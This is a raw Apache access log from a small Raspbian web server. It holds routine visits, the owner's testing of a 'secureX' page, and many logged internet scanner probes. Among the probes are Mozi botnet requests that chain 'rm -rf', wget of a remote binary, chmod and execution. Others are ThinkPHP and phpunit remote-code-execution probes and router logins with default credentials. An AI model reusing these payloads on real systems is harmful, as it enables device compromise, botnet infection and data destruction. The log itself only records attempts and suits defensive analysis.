45.247.184.72 - - [29/Mar/2021:20:33:57 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.185.112.41 - - [29/Mar/2021:22:15:11 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
205.185.122.102 - - [29/Mar/2021:23:11:11 +0200] "GET /config/getuser?index=0 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
45.134.225.193 - - [29/Mar/2021:23:31:23 +0200] "GET / HTTP/1.1" 200 295 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
61.242.40.190 - - [29/Mar/2021:23:39:30 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 497 "-" "Hello, world"
115.50.1.208 - - [30/Mar/2021:01:09:24 +0200] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 455 "-" "-"
69.25.114.212 - - [30/Mar/2021:01:12:10 +0200] "GET / HTTP/1.1" 200 272 "-" "libwww-perl/6.05"
192.80.107.208 - - [30/Mar/2021:01:13:45 +0200] "GET / HTTP/1.1" 200 253 "-" "-"
65.1.204.55 - - [30/Mar/2021:01:23:14 +0200] "POST /_ignition/execute-solution HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
65.1.204.55 - - [30/Mar/2021:01:23:14 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
65.1.204.55 - - [30/Mar/2021:01:23:14 +0200] "GET /login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
65.1.204.55 - - [30/Mar/2021:01:23:15 +0200] "GET /jenkins/login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
65.1.204.55 - - [30/Mar/2021:01:23:15 +0200] "GET /manager/html HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
65.1.204.55 - - [30/Mar/2021:01:23:15 +0200] "GET /wp-login.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
65.1.204.55 - - [30/Mar/2021:01:23:15 +0200] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
::1 - - [30/Mar/2021:01:23:22 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
92.118.161.21 - - [30/Mar/2021:03:04:30 +0200] "GET / HTTP/1.0" 200 272 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
189.129.112.139 - - [30/Mar/2021:03:15:41 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:32 +0200] "POST /api/jsonws/invoke HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:32 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:33 +0200] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:33 +0200] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:33 +0200] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:33 +0200] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 293 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:34 +0200] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:34 +0200] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:34 +0200] "GET /_ignition/execute-solution HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:34 +0200] "GET /console/ HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.165 - - [30/Mar/2021:03:49:34 +0200] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
119.28.152.247 - - [30/Mar/2021:03:56:42 +0200] "GET / HTTP/1.0" 200 272 "-" "-"
119.28.152.247 - - [30/Mar/2021:03:56:42 +0200] "GET / HTTP/1.0" 200 272 "-" "-"
119.28.152.247 - - [30/Mar/2021:03:56:42 +0200] "GET / HTTP/1.0" 200 272 "-" "-"
193.142.146.84 - - [30/Mar/2021:06:00:35 +0200] "GET / HTTP/1.1" 200 295 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
198.98.59.61 - - [30/Mar/2021:06:03:16 +0200] "GET / HTTP/1.1" 400 0 "-" "-"
85.204.212.13 - - [30/Mar/2021:06:42:28 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
205.185.122.102 - - [30/Mar/2021:07:42:34 +0200] "GET /config/getuser?index=0 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
186.33.76.100 - - [30/Mar/2021:08:46:22 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
205.185.127.244 - - [30/Mar/2021:08:48:24 +0200] "GET /config/getuser?index=0 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
65.49.20.66 - - [30/Mar/2021:09:53:09 +0200] "GET / HTTP/1.1" 200 253 "-" "-"
139.59.235.12 - - [30/Mar/2021:10:08:43 +0200] "GET / HTTP/1.1" 200 253 "-" "-"
192.241.221.83 - - [30/Mar/2021:10:15:44 +0200] "GET /portal/redlion HTTP/1.1" 404 441 "-" "Mozilla/5.0 zgrab/0.x"
119.123.247.18 - - [30/Mar/2021:10:18:37 +0200] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 0 "-" "-"
160.251.19.71 - - [30/Mar/2021:10:28:19 +0200] "POST /_ignition/execute-solution HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
160.251.19.71 - - [30/Mar/2021:10:28:22 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
160.251.19.71 - - [30/Mar/2021:10:28:49 +0200] "GET /login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
160.251.19.71 - - [30/Mar/2021:10:28:52 +0200] "GET /jenkins/login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
160.251.19.71 - - [30/Mar/2021:10:29:00 +0200] "GET /manager/html HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
160.251.19.71 - - [30/Mar/2021:10:29:06 +0200] "GET /wp-login.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
160.251.19.71 - - [30/Mar/2021:10:29:17 +0200] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1" 200 274 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
191.113.141.27 - - [30/Mar/2021:11:11:30 +0200] "GET / HTTP/1.1" 200 253 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
120.85.238.96 - - [30/Mar/2021:11:23:32 +0200] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 492 "-" "Hello, World"
91.166.71.69 - - [30/Mar/2021:11:32:55 +0200] "GET /SecureX HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:32:55 +0200] "GET /favicon.ico HTTP/1.1" 404 497 "http://82.121.247.198/SecureX" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:07 +0200] "GET /secureX HTTP/1.1" 301 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:07 +0200] "GET /secureX/ HTTP/1.1" 200 1206 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:14 +0200] "GET /secureX/gethint.php?q=l HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:14 +0200] "GET /secureX/gethint.php?q=lo HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:15 +0200] "GET /secureX/gethint.php?q=logi HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:15 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:15 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:15 +0200] "GET /secureX/gethint.php?q=login HTTP/1.1" 200 361 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:22 +0200] "GET /secureX/gethint.php?q=logi HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:22 +0200] "GET /secureX/gethint.php?q=log HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:22 +0200] "GET /secureX/gethint.php?q=lo HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:23 +0200] "GET /secureX/gethint.php?q=l HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:23 +0200] "GET /secureX/gethint.php?q=h HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:23 +0200] "GET /secureX/gethint.php?q=he HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:24 +0200] "GET /secureX/gethint.php?q=hel HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:24 +0200] "GET /secureX/gethint.php?q=hell HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:24 +0200] "GET /secureX/gethint.php?q=hello HTTP/1.1" 200 360 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:24 +0200] "GET /secureX/gethint.php?q=hello HTTP/1.1" 200 360 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
::1 - - [30/Mar/2021:11:33:31 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:11:33:32 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:11:33:33 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:11:33:34 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
91.166.71.69 - - [30/Mar/2021:11:33:57 +0200] "GET /secureX/gethint.php?q=hell HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:57 +0200] "GET /secureX/gethint.php?q=hel HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:57 +0200] "GET /secureX/gethint.php?q=he HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:57 +0200] "GET /secureX/gethint.php?q=h HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:58 +0200] "GET /secureX/gethint.php?q=o HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:33:59 +0200] "GET /secureX/gethint.php?q=or HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:00 +0200] "GET /secureX/gethint.php?q=orch HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:00 +0200] "GET /secureX/gethint.php?q=orch HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:00 +0200] "GET /secureX/gethint.php?q=orcher HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:00 +0200] "GET /secureX/gethint.php?q=orcher HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:01 +0200] "GET /secureX/gethint.php?q=orche HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:01 +0200] "GET /secureX/gethint.php?q=orches HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:01 +0200] "GET /secureX/gethint.php?q=orchestr HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:01 +0200] "GET /secureX/gethint.php?q=orchestr HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:01 +0200] "GET /secureX/gethint.php?q=orchestra HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:02 +0200] "GET /secureX/gethint.php?q=orchestrati HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:02 +0200] "GET /secureX/gethint.php?q=orchestratio HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:02 +0200] "GET /secureX/gethint.php?q=orchestratio HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:02 +0200] "GET /secureX/gethint.php?q=orchestration HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:11:34:03 +0200] "GET /secureX/gethint.php?q=orchestration HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
::1 - - [30/Mar/2021:11:34:09 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [30/Mar/2021:11:34:10 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
91.166.71.69 - - [30/Mar/2021:11:34:09 +0200] "GET /secureX/gethint.php?q=orchestration HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
::1 - - [30/Mar/2021:11:34:11 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
91.166.71.69 - - [30/Mar/2021:11:34:16 +0200] "GET /secureX/gethint.php?q=orchestration HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
::1 - - [30/Mar/2021:11:34:23 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
99.81.180.203 - - [30/Mar/2021:12:06:47 +0200] "GET /secureX/reset_secureX_action.php HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:06:47 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 231 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:06:47 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:06:54 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:06:54 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:06:59 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:06:59 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:04 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:05 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:10 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:10 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:15 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:16 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:21 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:22 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:27 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /secureX HTTP/1.1" 301 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /secureX/ HTTP/1.1" 200 1206 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /secureX/action.js HTTP/1.1" 200 584 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /secureX/bootstrap/css/bootstrap.css HTTP/1.1" 200 17075 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /secureX/jquery.min.js HTTP/1.1" 200 33668 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /secureX/images/secureX-1.png HTTP/1.1" 200 341486 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /favicon.ico HTTP/1.1" 404 496 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:28 +0200] "GET /secureX/sons/hi_patrick.mp3 HTTP/1.1" 206 24285 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
99.81.180.203 - - [30/Mar/2021:12:07:27 +0200] "GET /secureX/set_secureX_action.php?value=1 HTTP/1.1" 200 149 "-" "Go-http-client/1.1"
99.81.180.203 - - [30/Mar/2021:12:07:32 +0200] "GET /secureX/fichier.txt HTTP/1.1" 200 229 "-" "Go-http-client/1.1"
91.166.71.69 - - [30/Mar/2021:12:07:32 +0200] "GET /secureX/gethint.php?q=h HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:32 +0200] "GET /secureX/gethint.php?q=he HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:33 +0200] "GET /secureX/gethint.php?q=hel HTTP/1.1" 200 205 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [30/Mar/2021:12:07:33 +0200] "GET /secureX/gethint.php?q=hell HTTP/1.1" 200 206 "http://82.121.247.198/secureX/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
